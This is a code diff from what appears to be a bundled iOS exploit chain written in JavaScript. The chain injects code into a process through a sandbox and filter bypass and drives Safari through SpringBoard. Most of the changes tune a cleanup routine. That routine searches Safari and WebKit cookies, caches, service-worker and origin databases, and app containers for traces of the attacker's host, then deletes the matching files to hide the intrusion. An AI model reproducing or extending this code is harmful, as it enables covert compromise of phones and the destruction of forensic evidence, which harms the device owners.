@@ -8965,6 +8965,10 @@ function launchRepoPageInSafari(existingTask, migFilterBypass, existingAgentPid,
 		let loader = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](task, prelude + code, migFilterBypass);
 		let ok = loader.inject(agentPid);
 		LOG("[PE] " + label + " inject result: " + ok);
+		if (ok) {
+			LOG("[PE] " + label + " settle delay for SpringBoard main-thread URL dispatch");
+			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("usleep", 750000n);
+		}
 		return ok;
 	} catch (e) {
 		LOG("[PE] " + label + " exception: " + String(e));
@@ -8989,49 +8993,31 @@ function launchDonePageInSafari(existingTask, migFilterBypass, existingAgentPid)
 	function auditSafariOriginData() {
 		const Native = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
 		const Sandbox = libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"];
-		const MAX_SCAN_ENTRIES = 5000;
-		const MAX_CANDIDATE_LOGS = 200;
-		const MAX_CONTENT_SCAN_FILES = 260;
-		const MAX_CONTENT_SCAN_BYTES_PER_FILE = 1024 * 1024;
-		const MAX_TOTAL_CONTENT_SCAN_BYTES = 24 * 1024 * 1024;
-		const MAX_DELETE_TREE_ENTRIES = 2400;
+		const MAX_SCAN_ENTRIES = 1800;
+		const MAX_CANDIDATE_LOGS = 80;
+		const MAX_CONTENT_SCAN_FILES = 120;
+		const MAX_CONTENT_SCAN_BYTES_PER_FILE = 64 * 1024;
+		const MAX_TOTAL_CONTENT_SCAN_BYTES = 4 * 1024 * 1024;
+		const MAX_DELETE_TREE_ENTRIES = 900;
 	const tokenPaths = [
 		"/private/var/mobile/Library/",
 		"/private/var/mobile/Library/WebKit/",
-		"/private/var/mobile/Library/WebKit/WebsiteDataStore/",
-		"/private/var/mobile/Library/WebKit/WebsiteData/",
 		"/private/var/mobile/Library/WebKit/WebsiteData/Default/",
-		"/private/var/mobile/Library/WebKit/WebsiteData/IndexedDB/",
-		"/private/var/mobile/Library/WebKit/WebsiteData/LocalStorage/",
 		"/private/var/mobile/Library/WebKit/WebsiteData/ResourceLoadStatistics/",
+		"/private/var/mobile/Library/WebKit/WebsiteData/ServiceWorkers/",
 		"/private/var/mobile/Library/Safari/",
 		"/private/var/mobile/Library/Caches/",
-		"/private/var/mobile/Library/Caches/com.apple.mobilesafari/",
-		"/private/var/mobile/Library/Caches/com.apple.WebKit.Networking/",
-		"/private/var/mobile/Library/Caches/WebKit/",
 		"/private/var/mobile/Library/Caches/WebKit/NetworkCache/",
-		"/private/var/mobile/Library/Caches/WebKit/ServiceWorkers/",
-		"/private/var/mobile/Library/Caches/WebKit/HSTS/",
-		"/private/var/mobile/Library/Caches/WebKit/AlternativeServices/",
 		"/private/var/mobile/Library/Cookies/",
-		"/private/var/mobile/Containers/Data/Application/",
-		"/var/mobile/Containers/Data/Application/",
-		"/private/var/mobile/Containers/Shared/AppGroup/"
+		"/private/var/mobile/Containers/Data/Application/"
 	];
 	let roots = [
-		{ path: "/private/var/mobile/Library/WebKit/", depth: 8 },
-		{ path: "/private/var/mobile/Library/WebKit/WebsiteDataStore/", depth: 8 },
-		{ path: "/private/var/mobile/Library/WebKit/WebsiteData/Default/", depth: 6 },
-		{ path: "/private/var/mobile/Library/WebKit/WebsiteData/IndexedDB/", depth: 6 },
-		{ path: "/private/var/mobile/Library/WebKit/WebsiteData/LocalStorage/", depth: 5 },
-		{ path: "/private/var/mobile/Library/WebKit/WebsiteData/ResourceLoadStatistics/", depth: 4 },
-		{ path: "/private/var/mobile/Library/Safari/", depth: 5 },
-		{ path: "/private/var/mobile/Library/Caches/com.apple.mobilesafari/", depth: 6 },
-		{ path: "/private/var/mobile/Library/Caches/com.apple.WebKit.Networking/", depth: 6 },
-		{ path: "/private/var/mobile/Library/Caches/WebKit/", depth: 6 },
+		{ path: "/private/var/mobile/Library/WebKit/WebsiteData/Default/", depth: 2 },
+		{ path: "/private/var/mobile/Library/WebKit/WebsiteData/ResourceLoadStatistics/", depth: 1 },
+		{ path: "/private/var/mobile/Library/WebKit/WebsiteData/ServiceWorkers/", depth: 2 },
+		{ path: "/private/var/mobile/Library/Safari/", depth: 1 },
 		{ path: "/private/var/mobile/Library/Caches/WebKit/NetworkCache/", depth: 5 },
-		{ path: "/private/var/mobile/Library/Caches/WebKit/ServiceWorkers/", depth: 5 },
-		{ path: "/private/var/mobile/Library/Cookies/", depth: 3 }
+		{ path: "/private/var/mobile/Library/Cookies/", depth: 1 }
 	];
 	const recordStores = [
 		"/private/var/mobile/Library/Cookies/Cookies.binarycookies",
@@ -9195,7 +9181,7 @@ function launchDonePageInSafari(existingTask, migFilterBypass, existingAgentPid)
 		let queuedTreeDeleteLogs = 0;
 		let queuedTreeDeleted = 0;
 
-	LOG("[SAFARI-CLEAN] WebKit 22F76 paths: Library/WebKit/{WebsiteDataStore,WebsiteData/{Default,IndexedDB,LocalStorage,ResourceLoadStatistics}}, Library/Caches/WebKit/{NetworkCache,ServiceWorkers,HSTS,AlternativeServices}, Library/Caches/com.apple.WebKit.Networking");
+	LOG("[SAFARI-CLEAN] targeted paths: Safari state DBs, WebKit WebsiteData/Default origin files, ResourceLoadStatistics DBs, ServiceWorkers DBs, NetworkCache records");
 
 		function matchCandidate(path) {
 			let lower = String(path || "").toLowerCase();
@@ -9210,6 +9196,38 @@ function launchDonePageInSafari(existingTask, migFilterBypass, existingAgentPid)
 			}
 		}
 			return null;
+		}
+
+		function matchHostInString(value) {
+			let lower = String(value || "").toLowerCase();
+			for (let v of hostVariants) {
+				if (v && lower.indexOf(v.toLowerCase()) >= 0) {
+					return { scope: "origin", token: v };
+				}
+			}
+			return null;
+		}
+
+		function matchPathInString(value) {
+			let lower = String(value || "").toLowerCase();
+			for (let v of pathVariants) {
+				if (v && lower.indexOf(v.toLowerCase()) >= 0) {
+					return { scope: "path", token: v };
+				}
+			}
+			return null;
+		}
+
+		function matchContentCandidate(value, path) {
+			let hostMatch = matchHostInString(value);
+			if (!hostMatch) return null;
+			let lowerPath = String(path || "").toLowerCase();
+			if (repoToken && lowerPath.indexOf("/networkcache/") >= 0) {
+				let pathMatch = matchPathInString(value);
+				if (!pathMatch) return null;
+				return { scope: "origin+path", token: hostMatch.token + "+" + pathMatch.token };
+			}
+			return hostMatch;
 		}
 
 		function unlinkPath(path) {
@@ -9538,10 +9556,13 @@ function launchDonePageInSafari(existingTask, migFilterBypass, existingAgentPid)
 
 	function shouldContentScan(path) {
 		let lower = String(path || "").toLowerCase();
+		if (lower.indexOf("/bookmarks.db") >= 0 || lower.indexOf("/cloudtabs.db") >= 0) return false;
+		if (lower.slice(-7) === "/origin") return true;
+		if (sqliteKind(path)) return true;
+		if (lower.indexOf("/networkcache/") >= 0 && lower.indexOf("/records/") >= 0) return true;
 		if (lower.indexOf("/webkit/") < 0 && lower.indexOf("/safari/") < 0 && lower.indexOf("/cookies/") < 0) return false;
 		if (lower.indexOf("/bookmarks.db") >= 0 || lower.indexOf("/cloudtabs.db") >= 0) return false;
-		if (lower.indexOf(".png") >= 0 || lower.indexOf(".jpg") >= 0 || lower.indexOf(".jpeg") >= 0 || lower.indexOf(".gif") >= 0 || lower.indexOf(".mp4") >= 0) return false;
-		return true;
+		return false;
 	}
 
 	function shouldDeleteContentHit(path) {
@@ -9603,7 +9624,7 @@ function launchDonePageInSafari(existingTask, migFilterBypass, existingAgentPid)
 				let chunk = carry + bytesToLowerSearchString(Native.read(buf, gotNum), gotNum);
 				readForFile += gotNum;
 				contentScannedBytes += gotNum;
-				result = matchCandidate(chunk);
+				result = matchContentCandidate(chunk, path);
 				if (result) break;
 				carry = chunk.slice(-384);
 			}
@@ -9627,6 +9648,18 @@ function launchDonePageInSafari(existingTask, migFilterBypass, existingAgentPid)
 			}
 			return result;
 		}
+
+	function shouldDescendDir(path, depth) {
+		let lower = String(path || "").toLowerCase();
+		if (lower.indexOf("/networkcache/") >= 0) {
+			return lower.indexOf("/networkcache/version") >= 0 ||
+				lower.indexOf("/records") >= 0 ||
+				lower.indexOf("/resource") >= 0 ||
+				lower.indexOf("/subresources") >= 0;
+		}
+		if (lower.indexOf("/safari/") >= 0 || lower.indexOf("/cookies/") >= 0) return depth < 1;
+		return true;
+	}
 
 	function scanDir(dirPath, depth, maxDepth) {
 		if (scanned >= MAX_SCAN_ENTRIES) {
@@ -9655,7 +9688,7 @@ function launchDonePageInSafari(existingTask, migFilterBypass, existingAgentPid)
 				if (match) deletedEntry = logCandidate(fullPath, match, dirEntry);
 				if (deletedEntry) continue;
 				if (!dirEntry) scanFileContent(fullPath);
-				if (dirEntry && depth < maxDepth) scanDir(fullPath, depth + 1, maxDepth);
+				if (dirEntry && depth < maxDepth && shouldDescendDir(fullPath, depth + 1)) scanDir(fullPath, depth + 1, maxDepth);
 				if (scanned >= MAX_SCAN_ENTRIES) break;
 			}
 		} finally {
@@ -9698,19 +9731,12 @@ function launchDonePageInSafari(existingTask, migFilterBypass, existingAgentPid)
 					let safariContainer = rootExists(containerPath + "Library/Safari/") || rootExists(containerPath + "Library/Caches/com.apple.mobilesafari/");
 					if (!safariContainer) continue;
 					let candidates = [
-						{ path: containerPath + "Library/WebKit/WebsiteDataStore/", depth: 8 },
-					{ path: containerPath + "Library/WebKit/WebsiteData/", depth: 8 },
-					{ path: containerPath + "Library/WebKit/WebsiteData/Default/", depth: 6 },
-					{ path: containerPath + "Library/WebKit/WebsiteData/IndexedDB/", depth: 6 },
-					{ path: containerPath + "Library/WebKit/WebsiteData/LocalStorage/", depth: 5 },
-					{ path: containerPath + "Library/WebKit/WebsiteData/ResourceLoadStatistics/", depth: 4 },
-					{ path: containerPath + "Library/Safari/", depth: 5 },
-					{ path: containerPath + "Library/Caches/com.apple.mobilesafari/", depth: 5 },
-					{ path: containerPath + "Library/Caches/com.apple.WebKit.Networking/", depth: 6 },
-					{ path: containerPath + "Library/Caches/WebKit/", depth: 6 },
+					{ path: containerPath + "Library/WebKit/WebsiteData/Default/", depth: 2 },
+					{ path: containerPath + "Library/WebKit/WebsiteData/ResourceLoadStatistics/", depth: 1 },
+					{ path: containerPath + "Library/WebKit/WebsiteData/ServiceWorkers/", depth: 2 },
+					{ path: containerPath + "Library/Safari/", depth: 1 },
 					{ path: containerPath + "Library/Caches/WebKit/NetworkCache/", depth: 5 },
-					{ path: containerPath + "Library/Caches/WebKit/ServiceWorkers/", depth: 5 },
-					{ path: containerPath + "Library/Cookies/", depth: 3 }
+					{ path: containerPath + "Library/Cookies/", depth: 1 }
 				];
 				for (let candidate of candidates) {
 					if (rootExists(candidate.path)) {
@@ -9727,7 +9753,6 @@ function launchDonePageInSafari(existingTask, migFilterBypass, existingAgentPid)
 	}
 
 	discoverAppContainerRoots("/private/var/mobile/Containers/Data/Application/");
-	discoverAppContainerRoots("/var/mobile/Containers/Data/Application/");
 
 	for (let root of roots) {
 		scanDir(root.path, 0, root.depth);
